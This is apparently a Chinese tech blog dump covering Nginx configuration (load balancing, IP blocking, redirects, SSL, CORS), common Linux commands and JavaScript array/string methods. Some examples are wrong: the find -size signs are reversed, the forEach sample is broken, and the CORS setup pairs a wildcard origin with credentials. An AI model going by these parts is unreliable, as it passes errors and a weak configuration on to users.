localhost:8080; server localhost:8081;&#125;server &#123; listen 81; server_name localhost; client_max_body_size 1024M; location / &#123; proxy_pass http://test; proxy_set_header Host $host:$server_port; &#125;&#125; 负载均衡的核心代码为 1234upstream test &#123; server localhost:8080; server localhost:8081;&#125; 6.7.2 权重 指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 例如 1234upstream test &#123; server localhost:8080 weight=9; server localhost:8081 weight=1;&#125; 那么10次一般只会有1次会访问到8081，而有9次会访问到8080 6.7.3 ip_hash 上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。 12345upstream test &#123; ip_hash; server localhost:8080; server localhost:8081;&#125; 6.7.4 fair 这是个第三方模块，按后端服务器的响应时间来分配请求，响应时间短的优先分配。 12345upstream backend &#123; fair; server localhost:8080; server localhost:8081;&#125; 6.7.5 url_hash 这是个第三方模块，按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。 在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法 123456upstream backend &#123; hash $request_uri; hash_method crc32; server localhost:8080; server localhost:8081;&#125; 以上5种负载均衡各自适用不同情况下使用，所以可以根据实际情况选择使用哪种策略模式，不过fair和url_hash需要安装第三方模块才能使用 server指令可选参数： weight：设置一个服务器的访问权重，数值越高，收到的请求也越多； fail_timeout：在这个指定的时间内服务器必须提供响应，如果在这个时间内没有收到响应，那么服务器将会被标记为down状态； max_fails：设置在fail_timeout时间之内尝试对一个服务器连接的最大次数，如果超过这个次数，那么服务器将会被标记为down; down：标记一个服务器不再接受任何请求； backup：一旦其他服务器宕机，那么有该标记的机器将会接收请求。 keepalive指令： Nginx服务器将会为每一个worker进行保持同上游服务器的连接。 6.8 屏蔽ip 在nginx的配置文件nginx.conf中加入如下配置，可以放到http, server, location, limit_except语句块，需要注意相对路径，本例当中nginx.conf，blocksip.conf在同一个目录中。 1include blockip.conf; 在blockip.conf里面输入内容，如： 1234567891011121314deny 165.91.122.67;deny IP; # 屏蔽单个ip访问allow IP; # 允许单个ip访问deny all; # 屏蔽所有ip访问allow all; # 允许所有ip访问deny 123.0.0.0/8 # 屏蔽整个段即从123.0.0.1到123.255.255.254访问的命令deny 124.45.0.0/16 # 屏蔽IP段即从123.45.0.1到123.45.255.254访问的命令deny 123.45.6.0/24 # 屏蔽IP段即从123.45.6.1到123.45.6.254访问的命令# 如果你想实现这样的应用，除了几个IP外，其他全部拒绝allow 1.1.1.1; allow 1.1.1.2;deny all; 七、第三方模块安装方法1./configure --prefix=/你的安装目录 --add-module=/第三方模块目录 八、重定向 permanent 永久性重定向。请求日志中的状态码为301 redirect 临时重定向。请求日志中的状态码为302 8.1 重定向整个网站1234server &#123; server_name old-site.com return 301 $scheme://new-site.com$request_uri;&#125; 8.2 重定向单页12345server &#123; location = /oldpage.html &#123; return 301 http://example.org/newpage.html; &#125;&#125; 8.3 重定向整个子路径123location /old-site &#123; rewrite ^/old-site/(.*) http://example.org/new-site/$1 permanent;&#125; 九、性能9.1 内容缓存 允许浏览器基本上永久地缓存静态内容。 Nginx将为您设置Expires和Cache-Control头信息。 1234location /static &#123; root /data; expires max;&#125; 如果要求浏览器永远不会缓存响应（例如用于跟踪请求），请使用-1。 1234location = /empty.gif &#123; empty_gif; expires -1;&#125; 9.2 Gzip压缩123456789101112131415gzip on;gzip_buffers 16 8k;gzip_comp_level 6;gzip_http_version 1.1;gzip_min_length 256;gzip_proxied any;gzip_vary on;gzip_types text/xml application/xml application/atom+xml application/rss+xml application/xhtml+xml image/svg+xml text/javascript application/javascript application/x-javascript text/x-json application/json application/x-web-app-manifest+json text/css text/plain text/x-component font/opentype application/x-font-ttf application/vnd.ms-fontobject image/x-icon;gzip_disable \"msie6\"; 9.3 打开文件缓存1234open_file_cache max=1000 inactive=20s;open_file_cache_valid 30s;open_file_cache_min_uses 2;open_file_cache_errors on; 9.4 SSL缓存12ssl_session_cache shared:SSL:10m;ssl_session_timeout 10m; 9.5 上游Keepalive123456789101112upstream backend &#123; server 127.0.0.1:8080; keepalive 32;&#125;server &#123; ... location /api/ &#123; proxy_pass http://backend; proxy_http_version 1.1; proxy_set_header Connection \"\"; &#125;&#125; 9.6 监控 使用ngxtop实时解析nginx访问日志，并且将处理结果输出到终端，功能类似于系统命令top。所有示例都读取nginx配置文件的访问日志位置和格式。如果要指定访问日志文件和/或日志格式，请使用-f和-a选项。 注意：在nginx配置中/usr/local/nginx/conf/nginx.conf日志文件必须是绝对路径。 12345678910111213141516171819202122# 安装 ngxtoppip install ngxtop# 实时状态ngxtop# 状态为404的前10个请求的路径：ngxtop top request_path --filter 'status == 404'# 发送总字节数最多的前10个请求ngxtop --order-by 'avg(bytes_sent) * count'# 排名前十位的IP，例如，谁攻击你最多ngxtop --group-by remote_addr# 打印具有4xx或5xx状态的请求，以及status和http refererngxtop -i 'status &gt;= 400' print request status http_referer# 由200个请求路径响应发送的平均正文字节以'foo'开始：ngxtop avg bytes_sent --filter 'status == 200 and request_path.startswith(\"foo\")'# 使用“common”日志格式从远程机器分析apache访问日志ssh remote tail -f /var/log/apache2/access.log | ngxtop -f common 十、常见使用场景10.1 跨域问题 在工作中，有时候会遇到一些接口不支持跨域，这时候可以简单的添加add_headers来支持cors跨域。配置如下： 123456789101112131415server &#123; listen 80; server_name api.xxx.com; add_header 'Access-Control-Allow-Origin' '*'; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET,POST,HEAD'; location / &#123; proxy_pass http://127.0.0.1:3000; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $http_host; &#125; &#125; 上面更改头信息，还有一种，使用 rewrite 指令重定向URI来解决跨域问题。 1234567891011121314151617181920212223242526272829303132333435363738upstream test &#123; server 127.0.0.1:8080; server localhost:8081;&#125;server &#123; listen 80; server_name api.xxx.com; location / &#123; root html; #去请求../html文件夹里的文件 index index.html index.htm; #首页响应地址 &#125; # 用于拦截请求，匹配任何以 /api/开头的地址， # 匹配符合以后，停止往下搜索正则。 location ^~/api/&#123; # 代表重写拦截进来的请求，并且只能对域名后边的除去传递的参数外的字符串起作用， # 例如www.a.com/proxy/api/msg?meth=1&amp;par=2重写，只对/proxy/api/msg重写。 # rewrite后面的参数是一个简单的正则 ^/api/(.*)$， # $1代表正则中的第一个()，$2代表第二个()的值，以此类推。 rewrite ^/api/(.*)$ /$1 break; # 把请求代理到其他主机 # 其中 http://www.b.com/ 写法和 http://www.b.com写法的区别如下 # 如果你的请求地址是他 http://server/html/test.jsp # 配置一： http://www.b.com/ 后面有“/” # 将反向代理成 http://www.b.com/html/test.jsp 访问 # 配置一： http://www.b.com 后面没有有“/” # 将反向代理成 http://www.b.com/test.jsp 访问 proxy_pass http://test; # 如果 proxy_pass URL 是 http://a.xx.com/platform/ 这种情况 # proxy_cookie_path应该设置成 /platform/ / (注意两个斜杠之间有空格)。 proxy_cookie_path /platfrom/ /; # http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass_header # 设置 Cookie 头通过 proxy_pass_header Set-Cookie; &#125; &#125; 10.2 跳转到带www的域上面123456789101112131415server &#123; listen 80; # 配置正常的带www的域名 server_name www.wangchujiang.com; root /home/www/wabg/download; location / &#123; try_files $uri $uri/ /index.html =404; &#125;&#125;server &#123; # 这个要放到下面， # 将不带www的 wangchujiang.com 永久性重定向到 https://www.wangchujiang.com server_name wangchujiang.com; rewrite ^(.*) https://www.wangchujiang.com$1 permanent;&#125; 10.3 代理转发12345678910111213141516171819202122232425262728293031323334upstream server-api&#123; # api 代理服务地址 server 127.0.0.1:3110; &#125;upstream server-resource&#123; # 静态资源 代理服务地址 server 127.0.0.1:3120;&#125;server &#123; listen 3111; server_name localhost; # 这里指定域名 root /home/www/server-statics; # 匹配 api 路由的反向代理到API服务 location ^~/api/ &#123; rewrite ^/(.*)$ /$1 break; proxy_pass http://server-api; &#125; # 假设这里验证码也在API服务中 location ^~/captcha &#123; rewrite ^/(.*)$ /$1 break; proxy_pass http://server-api; &#125; # 假设你的图片资源全部在另外一个服务上面 location ^~/img/ &#123; rewrite ^/(.*)$ /$1 break; proxy_pass http://server-resource; &#125; # 路由在前端，后端没有真实路由，在路由不存在的 404状态的页面返回 /index.html # 这个方式使用场景，你在写React或者Vue项目的时候，没有真实路由 location / &#123; try_files $uri $uri/ /index.html =404; # ^ 空格很重要 &#125;&#125; 10.4 代理转发连接替换1234location ^~/api/upload &#123; rewrite ^/(.*)$ /wfs/v1/upload break; proxy_pass http://wfs-api;&#125; 10.5 ssl配置 超文本传输安全协议（缩写：HTTPS，英语：Hypertext Transfer Protocol Secure）是超文本传输协议和SSL/TLS的组合，用以提供加密通讯及对网络服务器身份的鉴定。HTTPS连接经常被用于万维网上的交易支付和企业信息系统中敏感信息的传输。HTTPS不应与在RFC 2660中定义的安全超文本传输协议（S-HTTP）相混。HTTPS 目前已经是所有注重隐私和安全的网站的首选，随着技术的不断发展，HTTPS 网站已不再是大型网站的专利，所有普通的个人站长和博客均可以自己动手搭建一个安全的加密的网站。 创建SSL证书，如果你购买的证书，就可以直接下载 1234567891011sudo mkdir /etc/nginx/ssl# 创建了有效期100年，加密强度为RSA2048的SSL密钥key和X509证书文件。sudo openssl req -x509 -nodes -days 36500 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt# 上面命令，会有下面需要填写内容Country Name (2 letter code) [AU]:USState or Province Name (full name) [Some-State]:New YorkLocality Name (eg, city) []:New York CityOrganization Name (eg, company) [Internet Widgits Pty Ltd]:Bouncy Castles, Inc.Organizational Unit Name (eg, section) []:Ministry of Water SlidesCommon Name (e.g. server FQDN or YOUR name) []:your_domain.comEmail Address []:admin@your_domain.com 创建自签证书 123456789101112首先，创建证书和私钥的目录# mkdir -p /etc/nginx/cert# cd /etc/nginx/cert创建服务器私钥，命令会让你输入一个口令：# openssl genrsa -des3 -out nginx.key 2048创建签名请求的证书（CSR）：# openssl req -new -key nginx.key -out nginx.csr在加载SSL支持的Nginx并使用上述私钥时除去必须的口令：# cp nginx.key nginx.key.org# openssl rsa -in nginx.key.org -out nginx.key最后标记证书使用上述私钥和CSR：# openssl x509 -req -days 365 -in nginx.csr -signkey nginx.key -out nginx.crt 查看目前nginx编译选项 1sbin/nginx -V 输出下面内容 1234nginx version: nginx/1.7.8built by gcc 4.4.7 20120313 (Red Hat 4.4.7-4) (GCC)TLS SNI support enabledconfigure arguments: --prefix=/usr/local/nginx-1.7.8 --with-http_ssl_module --with-http_spdy_module --with-http_stub_status_module --with-pcre 如果依赖的模块不存在，可以进入安装目录，输入下面命令重新编译安装。 1./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module 运行完成之后还需要make (不用make install) 1234# 备份nginx的二进制文件cp -rf /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.bak# 覆盖nginx的二进制文件cp -rf objs/nginx /usr/local/nginx/sbin/ HTTPS server 1234567891011121314151617181920212223242526server &#123; listen 443 ssl; server_name localhost; ssl_certificate /etc/nginx/ssl/nginx.crt; ssl_certificate_key /etc/nginx/ssl/nginx.key; # 禁止在header中出现服务器版本，防止黑客利用版本漏洞攻击 server_tokens off; # 设置ssl/tls会话缓存的类型和大小。如果设置了这个参数一般是shared，buildin可能会参数内存碎片，默认是none，和off差不多，停用缓存。如shared:SSL:10m表示我所有的nginx工作进程共享ssl会话缓存，官网介绍说1M可以存放约4000个sessions。 ssl_session_cache shared:SSL:1m; # 客户端可以重用会话缓存中ssl参数的过期时间，内网系统默认5分钟太短了，可以设成30m即30分钟甚至4h。 ssl_session_timeout 5m; # 选择加密套件，不同的浏览器所支持的套件（和顺序）可能会不同。 # 这里指定的是OpenSSL库能够识别的写法，你可以通过 openssl -v cipher 'RC4:HIGH:!aNULL:!MD5'（后面是你所指定的套件加密算法） 来看所支持算法。 ssl_ciphers HIGH:!aNULL:!MD5; # 设置协商加密算法时，优先使用我们服务端的加密套件，而不是客户端浏览器的加密套件。 ssl_prefer_server_ciphers on; location / &#123; root html; index index.html index.htm; &#125;&#125; 10.6 强制将http重定向到https1234567server &#123; listen 80; server_name example.com; rewrite ^ https://$http_host$request_uri? permanent; # 强制将http重定向到https # 在错误页面和“服务器”响应头字段中启用或禁用发射nginx版本。 防止黑客利用版本漏洞攻击 server_tokens off;&#125; 10.7 两个虚拟主机 纯静态-html 支持 1234567891011121314151617181920http &#123; server &#123; listen 80; server_name www.domain1.com; access_log logs/domain1.access.log main; location / &#123; index index.html; root /var/www/domain1.com/htdocs; &#125; &#125; server &#123; listen 80; server_name www.domain2.com; access_log logs/domain2.access.log main; location / &#123; index index.html; root /var/www/domain2.com/htdocs; &#125; &#125;&#125; 10.8 虚拟主机标准配置1234567891011http &#123; server &#123; listen 80 default; server_name _ *; access_log logs/default.access.log main; location / &#123; index index.html; root /var/www/default/htdocs; &#125; &#125;&#125; 10.9 防盗链12345678location ~* \\.(gif|jpg|png|swf|flv)$ &#123; root html valid_referers none blocked *.nginxcn.com; if ($invalid_referer) &#123; rewrite ^/ www.nginx.cn #return 404; &#125;&#125; 10.10虚拟目录配置alias指定的目录是准确的，root是指定目录的上级目录，并且该上级目录要含有location指定名称的同名目录。 12345678location /img/ &#123; alias /var/www/image/;&#125;# 访问/img/目录里面的文件时，ningx会自动去/var/www/image/目录找文件location /img/ &#123; root /var/www/image;&#125;# 访问/img/目录下的文件时，nginx会去/var/www/image/img/目录下找文件。] 10.11 防盗图配置123456location ~ \\/public\\/(css|js|img)\\/.*\\.(js|css|gif|jpg|jpeg|png|bmp|swf) &#123; valid_referers none blocked *.jslite.io; if ($invalid_referer) &#123; rewrite ^/ http://wangchujiang.com/piratesp.png; &#125;&#125; 10.12 屏蔽.git等文件123location ~ (.git|.gitattributes|.gitignore|.svn) &#123; deny all;&#125; 域名路径加不加需要都能正常访问12345http://wangchujiang.com/api/index.php?a=1&amp;name=wcj ^ 有后缀http://wangchujiang.com/api/index?a=1&amp;name=wcj ^ 没有后缀 nginx rewrite规则如下： 12345678910rewrite ^/(.*)/$ /index.php?/$1 permanent;if (!-d $request_filename)&#123; set $rule_1 1$rule_1;&#125;if (!-f $request_filename)&#123; set $rule_1 2$rule_1;&#125;if ($rule_1 = \"21\")&#123; rewrite ^/ /index.php last;&#125; 十一、错误问题1The plain HTTP request was sent to HTTPS port 解决办法，fastcgi_param HTTPS $https if_not_empty 添加这条规则， 1234567891011121314server &#123; listen 443 ssl; # 注意这条规则 server_name my.domain.com; fastcgi_param HTTPS $https if_not_empty; fastcgi_param HTTPS on; ssl_certificate /etc/ssl/certs/your.pem; ssl_certificate_key /etc/ssl/private/your.key; location / &#123; # Your config here... &#125;&#125; 十二、精品文章参考 负载均衡原理的解析 Nginx泛域名解析，实现多个二级域名 深入 NGINX: 我们如何设计性能和扩展 Inside NGINX: How We Designed for Performance &amp; Scale Nginx开发从入门到精通 Nginx的优化与防盗链 实战开发一个Nginx扩展 (Nginx Module) Nginx+Keepalived(双机热备)搭建高可用负载均衡环境(HA) Nginx 平滑升级 Nginx最新模块—ngx_http_mirror_module分析可以做版本发布前的预先验证，进行流量放大后的压测等等","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://ru23.com/tags/Nginx/"}]},{"title":"日常频繁使用的Linux命令","slug":"2018-02-linux-frequently-use-command","date":"2018-02-25T01:32:41.000Z","updated":"2018-10-24T03:46:02.352Z","comments":true,"path":"note/fcca662b.html","link":"","permalink":"https://ru23.com/note/fcca662b.html","excerpt":"","text":"一、文件管理1.1 创建删除文件 mkdir(-p多层创建) touch cp(-r递归复制) rm -rf mv(改名、移动剪切) cat (打印) 1.2 创建删除软连接 linux下的软链接类似于windows下的快捷方式。常用于实际路径很深，每次进入的时候需要花费一定时间，此时我们在根目录创建一个软链接指向该目录，那么我们进入该软连接其实就是进入了软链接指向的实际目录。 1ln -s /data/elastic/plugin/ik/custom myES 以上命令中的 /data/elastic/plugin/ik/custom 就是源文件，myES 是链接文件名， 其作用是当进入 myES 目录，实际上是链接进入了 /data/elastic/plugin/ik/custom 目录 删除软链接 rm -rf myES 注意不是 rm -rf myES/ 1.3 重定向命令 ls -l /etc &gt; /home/myback.txt (覆盖重定向) 把显示的结果覆盖到/home/myback.txt中去 ls -l /etc &gt;&gt; /home/myback.txt (追加重定向) 把显示的结果追加到/home/myback.txt中去 1.4 查看文件大小 查看某个文件夹当前所占用的空间使用 du -h file 查看当前目录下的所有文件各个大小 du -sh * 二、搜索命令2.1 管道过滤 使用管道命令过滤搜索的内容 ls -l /etc | more 2.2 查询命令 which 在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果 123# `-a`：将所有由`PATH`目录中可以找到的命令均列出来，而不是只列出第一个被找到的命令[root@www ~] # which ifconfig/sbin/ifconfig whereis -b 只查找二进制格式的文件 -m 只查找在说明文件manual路径下的文件 -s 只招source源文件 -u 查找不在上述三个选项当中的其他特殊文件 只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s） 1whereis [-bmsu] 文件或目录名 1234[root@www ~] # whereis ifconfigifconfig: /sbin/ifconfig /usr/share/man/man8/ifconfig.8.gz[root@www ~] # whereis -m ifconfigifconfig: /usr/share/man/man8/ifconfig.8.gz locate -i：忽略大小写差异； -r：后面可接正则表达式的实现方式。 相当于find -name，可快速查找文件 1locate [-ir] keyword 12345[root@www ~] # locate passwd/etc/passwd/etc/passwd-/etc/news/passwd.nntp/etc/pam.d/passwd find查找任何文件 最常用和最强大的查找命令，可以用它找到任何想找的文件 1find [PATH] [option] [action] find参数：基于文件名的搜索 与文件名有关的参数如下 -name filename：查找文件名为filename的文件。filename可使用正则表达式表示 1[root@www ~] # find / -name passwd 查找文件名为passwd的文件 find参数：基于文件大小的搜索 与文件大小有关的参数如下 -size SIZE：查找文件大小刚好等于SIZE的文件 -size -SIZE：查找文件大小大于SIZE的文件 -size +SIZE：查找文件大小小于SIZE的文件 其中，SIZE的单位有 c —— byte，字节； w —— 字（2字节）； b —— bit，块（512字节）； k —— 千字节； M —— 兆字节； G —— 吉字节 1234[root@www ~] # find . -type f -size +10k搜索大于10KB的文件[root@www ~] # find . -type f -size 10k搜索等于10KB的文件 注意 通常find不很常用，因为速度慢！ 通常都是先使用whereis或者locate来检查，当真的找不到了，才用find查找 三、压缩解压命令 *.tar 用 tar -xvf 解压 *.gz 用 gzip -d或者gunzip 解压 *.tar.gz和*.tgz 用 tar -xzf 解压 *.bz2 用bzip2 -d或者用bunzip2 解压 *.tar.bz2用tar -xjf 解压 *.Z 用 uncompress 解压 *.tar.Z 用tar -xZf 解压 *.rar 用 unrar e解压 *.zip 用 unzip 解压 四、VI相关 定位到头尾 G 定位到尾 1G 定位到头 nG 定位到指定行 复制 复制一行 yy 复制当前行 复制多行 7yy 从当前行开始复制７行 复制当前到行尾的内容 y$ 粘贴 p 大写P代表贴至游标前 选择复制 v进入可视化 删除 删除一行 dd 剪切至行首 d^ 剪切至行尾 d$ 搜索 /搜索的关键字，按n切换下一个关键字 五、磁盘管理 查看内存使用情况： free -m (m为MB，g为GB) 查看对应磁盘使用情况： df -h 六、进程管理 pkill 根据进程名杀死进程 ps 列出系统中运行的进程，包括进程号、命令、CPU使用量、内存使用量 ps -a 列出所有运行中/激活进程 ps -ef |grep processName 列出需要进程 ps -aux 显示进程信息 pstree linux中，每一个进程都是由其父进程创建的。此命令以可视化方式显示进程，通过显示进程的树状图来展示进程间关系 top 可以监视系统中不同的进程所使用的资源 显示进程的数据包括PID、进程属主、优先级、%CPU、%memory等。可以使用这些显示指示出资源使用量 七、网络管理7.1 下载源管理 yum list | grep nginx 查看是否有Nginx源 7.2 防火墙相关 linux查看防火墙状态及开启关闭命令 service方式 12345678910# 查看防火墙状态[root@centos6 ~]# service iptables status# 开启防火墙[root@centos6 ~]# service iptables start# 关闭防火墙[root@centos6 ~]# service iptables stop iptables方式 12345678910[root@centos6 ~]# cd /etc/init.d/# 查看状态[root@centos6 init.d]# /etc/init.d/iptables status# 暂时关闭防火墙 [root@centos6 init.d]# /etc/init.d/iptables stop# iptables[root@centos6 init.d]# /etc/init.d/iptables restart linux的防火墙是否阻止80端口 返回有内容说明开通，没返回内容，则说明阻止 iptables -vnL | grep &quot;:80 &quot; 八、上传文件相关 从远处复制文件到本地目录 scp root@10.10.10.10:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/ 上传本地目录到远程机器指定目录(拷贝目录带上-r,递归复制) scp -r /opt/soft/mongodb root@10.10.10.10:/opt/soft/scptest 九、系统相关9.1 CPU管理 查看对应CPU使用情况 cat /proc/cpuinfo 只显示一行对应的CPU型号以及其他信息 cat /proc/cpuinfo | grep &quot;model name&quot; | head -1 系统有几个核就会显示几行 cat /proc/cpuinfo | grep &quot;model name&quot; 统计出一共有多少核 cat /proc/cpuinfo | grep &quot;model name&quot; | wc -l 9.2其他 查看对应服务器版本当前操作系统发行版信息 cat /etc/issue 或 cat /etc/redhat-release 查看更为底层的版本信息： cat /proc/version","categories":[{"name":"Back-end","slug":"Back-end","permalink":"https://ru23.com/categories/Back-end/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://ru23.com/tags/Linux/"}]},{"title":"JavaScript数组、字符串、对象常用方法","slug":"2018-02-js-string-arr-object-api","date":"2018-02-23T07:10:12.000Z","updated":"2018-10-24T03:46:02.350Z","comments":true,"path":"note/1196ec8b.html","link":"","permalink":"https://ru23.com/note/1196ec8b.html","excerpt":"","text":"一、String对象1.1 slice stringObject.slice(start, end) 123456var a = 'Hello world!';var b = a.slice(2);var c = a.slice(-4, -2);// a: 'Hello world!'// b: 'llo world!'// c: 'rl'，参数可为负 1.2 substr stringObject.substr(start, length) 123456var a = 'Hello world!';var b = a.substr(0, 4);var c = a.substr(-5, 2);// a: 'Hello world!'// b: 'Hell'// c: 'or'，参数可为负 1.3 substring stringObject.substring(start, stop) 12345678var a = 'Hello world!';var b = a.substring(0, 4);var c = a.substring(3, 2);var d = a.substring(0, -1);// a: 'Hello world!'// b: 'Hell'// c: 'l'，start比stop小，交换这两个参数// d: ''，参数为负，返回空字符串 slice、substr、substring都是字符串的切割方法，三者之间有细微的区别，根据不同的使用场景可以灵活使用。三种方法都是生成新的字符串，而不是修改原string 二、Array对象2.1 concat 参数可以为具体的值，也可以为数组对象，可以任意多个。不改变现有的数组，返回被连接数组的一个副本。 123456var a = [1, 2, 3];var b = a.concat(4, 5);var c = a.concat([4, 5]);// a: [1, 2, 3]// b: [1, 2, 3, 4, 5]// c: [1, 2, 3, 4, 5] 2.2 pop 删除 arrayObject 的最后一个元素，把数组长度减 1，并且返回它删除的元素的值。如果数组已经为空，则 pop() 不改变数组，并返回 undefined 值。该方法会改变原数组 1234var a = [1, 2, 3];var b = a.pop();// a: [1, 2]，修改了原数组// b: 3，返回删除元素的值 2.3 push 参数顺序添加到 arrayObject 的尾部，直接修改arrayObject 1234var a = [1, 2, 3];var b = a.push(4, 5);// a: [1, 2, 3, 4, 5]，修改了原数组// b: 5，返回修改后的数组的长度 2.4 shift 把数组的第一个元素从其中删除，并返回第一个元素的值。如果数组是空的，那么 shift() 方法将不进行任何操作，返回undefined值。该方法会改变原数组。类比pop方法 1234var a = [1, 2, 3];var b = a.shift();// a: [2, 3]，修改了原数组// b: 1，返回删除元素的值 2.5 unshift 向数组的开头添加一个或更多元素，并返回新的长度。该方法的第一个参数将成为数组的新元素 0，如果还有第二个参数，它将成为新的元素 1，以此类推 1234var a = [1, 2, 3];var b = a.unshift(4, 5);// a: [ 4, 5, 1, 2, 3 ]，修改了原数组// b: 5，返回修改后的数组的长度 2.6 slice 返回一个新的数组，包含从 start 到 end （不包括该元素）的 arrayObject 中的元素。该方法不会修改原数组 123456789var a = [1, 2, 3, 4, 5];var b = a.slice(2);// a: [1, 2, 3, 4, 5]，不修改原数组// b: [3, 4, 5]，返回新数组var c = [1, 2, 3, 4, 5];var d = c.slice(2, -1);// c: [1, 2, 3, 4, 5]，不修改原数组// d: [3, 4]，返回新数组 2.7 splice 可删除从 index 处开始的零个或多个元素，并且用参数列表中声明的一个或多个值来替换那些被删除的元素。如果从 arrayObject 中删除了元素，则返回的是含有被删除的元素的数组。 12345678910111213141516171819var a = [1, 2, 3, 4, 5];var b = a.splice(1, 1);// a: [1, 3, 4, 5]，修改了原数组// b: [2]，返回新数组var c = [1, 2, 3, 4, 5];var d = c.splice(-1, 1);// c: [1, 2, 3, 4]，修改了原数组// d: [5]，返回新数组var e = [1, 2, 3, 4, 5];var f = e.splice(1, 1, 6, 7);// e: [ 1, 6, 7, 3, 4, 5 ]，修改了原数组// f: [2]，返回新数组var g = [1, 2, 3, 4, 5];var h = g.splice(1, 0, 8);// g: [ 1, 8, 2, 3, 4, 5 ]，修改了原数组// h: []，没有删除值，返回空数组 2.8 sort 无参数时，将按字母顺序对数组中的元素进行排序。参数为比较函数时，如果要交换prev和next的值，返回大于0的值 123456var a = [1, 10, 8, 6, 9];var b = a.sort(function (prev, next) &#123; return prev - next;&#125;);// a: [1, 6, 8, 9, 10]，修改了原数组// b: [1, 6, 8, 9, 10]，返回修改后的数组 2.9 reverse 用于颠倒数组中元素的顺序。会改变原数组 1234var a = [1, 2, 3];var b = a.reverse();// a: [3, 2, 1]，修改了原数组// b: [3, 2, 1]，返回修改后的数组 2.10 map 有返回值，返回一个新的数组，每个元素为调用func的结果 123456let list = [1, 2, 3, 4, 5];let other = list.map((d, i) =&gt; &#123; return d * 2;&#125;);console.log(other);// print: [2, 4, 6, 8, 10] 2.11 forEach 数组的每个元素执行一次提供的函数。一般来说不修改原数组，但也可以通过处理函数修改原数组。该方法很灵活，可类比for...of 没有返回值，只针对每个元素调用func。 优点：代码简介。 缺点：无法使用break，return等终止循环 value 当前操作的数组元素 当前操作元素的数组索引 array 当前数组的引用 123456let list = [1, 2, 3, 4, 5];list.forEach((d, i) =&gt; &#123; this.push(d * 2);&#125;);console.log(other);// print: [2, 4, 6, 8, 10] 2.12 find 返回数组中第一个满足测试条件（返回true）的元素。如果不存在这样的元素，返回undefined。findIndex类似，只不过返回的是第一个满足测试条件的元素的index 123456var a = [1, 2, 3];var b = a.find((curVal) =&gt; curVal === 1);var c = a.find((curVal) =&gt; curVal === 4);// a: [1, 2, 3]，不修改原数组// b: 1// c: undefined 2.13 filter 返回数组中所有满足测试条件（返回true）的元素组成的数组。如果不存在这样的元素，返回[] 123456var a = [1, 2, 3];var b = a.filter((curVal) =&gt; curVal &gt; 1);var c = a.filter((curVal) =&gt; curVal &gt; 3);// a: [1, 2, 3]，不修改原数组// b: [2, 3]// c: [] 2.14 reduce和reduceRight .reduce从左到右而.reduceRight从右到左循环遍历数组，每次调用接收目前为止的部分结果和当前遍历的值 两种方法都有如下典型用法：.reduce(callback(previousValue, currentValue, index, array), initialValue)。 previousValue是最后被调用的回调函数的返回值，initialValue是开始时previousValue被初始化的值。currentValue 是当前被遍历的元素值，index是当前元素在数组中的索引值。array是对调用.reduce数组的简单引用 12345678Array.prototype.sum = function () &#123; return this.reduce(function (partial, value) &#123; return partial + value &#125;, 0)&#125;;[3,4,5,6,10].sum()// &lt;- 28 可以使用.reduce作为对象的字符串生成器 123456789101112131415function concat (input) &#123; return input.reduce(function (partial, value) &#123; if (partial) &#123; partial += ', ' &#125; return partial + value &#125;, '')&#125;concat([ &#123; name: 'George' &#125;, &#123; name: 'Sam' &#125;, &#123; name: 'Pear' &#125;])// &lt;- 'George, Sam, Pear' 2.15 some 返回一个boolean，判断是否有元素符合func条件，如果有一个元素符合func条件，则循环会终止 1234567let list = [1, 2, 3, 4, 5];list.some((d, i) =&gt; &#123; console.log(d, i); return d &gt; 3;&#125;);// print: 1,0 2,1 3,2 4,3// return false 2.16 every 返回一个boolean，判断每个元素是否符合func条件，有一个元素不满足func条件，则循环终止，返回false 1234567let list = [1, 2, 3, 4, 5];list.every((d, i) =&gt; &#123; console.log(d, i); return d &lt; 3;&#125;);// print: 1,0 2,1 3,2// return false 三、Object3.1 for in for-in循环实际是为循环”enumerable“对象而设计的，for in也可以循环数组，但是不推荐这样使用，for–in是用来循环带有字符串key的对象的方法 12345var obj = &#123;a:1, b:2, c:3&#125;;for (var prop in obj) &#123; console.log(\"obj.\" + prop + \" = \" + obj[prop]);&#125;// print: \"obj.a = 1\" \"obj.b = 2\" \"obj.c = 3\" 3.2 for of for of为ES6提供，具有iterator接口，就可以用for of循环遍历它的成员 for of循环可以使用的范围包括数组、Set和Map结构、某些类似数组的对象（比如arguments对象、DOM NodeList对象）、后文的Generator对象，以及字符串 3.2.1 entries entries() 返回一个遍历器对象，用来遍历[键名, 键值]组成的数组。对于数组，键名就是索引值；对于Set，键名与键值相同。Map结构的iterator接口，默认就是调用entries方法 3.2.2 keys keys() 返回一个遍历器对象，用来遍历所有的键名。 3.2.3 values values()返回一个遍历器对象，用来遍历所有的键值。 这三个方法调用后生成的遍历器对象，所遍历的都是计算生成的数据结构 123456789101112131415161718192021222324// 遍历数组let list = [1, 2, 3, 4, 5];for (let e of list) &#123; console.log(e);&#125;// print: 1 2 3 4 5// 遍历对象obj = &#123;a:1, b:2, c:3&#125;;for (let key of Object.keys(obj)) &#123; console.log(key, 